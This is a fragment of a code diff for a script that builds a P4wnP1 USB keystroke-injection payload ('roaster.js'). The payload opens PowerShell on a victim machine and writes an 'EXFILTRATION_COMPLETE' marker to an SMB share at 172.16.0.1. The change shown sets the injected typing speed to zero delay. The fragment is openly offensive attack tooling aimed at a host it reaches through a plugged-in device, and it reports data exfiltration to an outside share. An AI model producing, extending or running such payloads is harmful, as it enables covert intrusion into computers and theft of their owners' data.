@@ -74,7 +74,7 @@ echo "type(\"powershell\")"  >> /usr/local/P4wnP1/HIDScripts/roaster.js
 echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
 echo "press(\"ENTER\");" >> /usr/local/P4wnP1/HIDScripts/roaster.js
 echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
-echo "typingSpeed(50,50);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
+echo "typingSpeed(0,0);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
 echo 'type("New-Item -Path \\\\172.16.0.1\\s -ItemType \"file\" -Name \"EXFILTRATION_COMPLETE\" -Value \"EXFILTRATION_COMPLETE\"")' >> /usr/local/P4wnP1/HIDScripts/roaster.js
 echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
 echo "press(\"ENTER\");" >> /usr/local/P4wnP1/HIDScripts/roaster.js
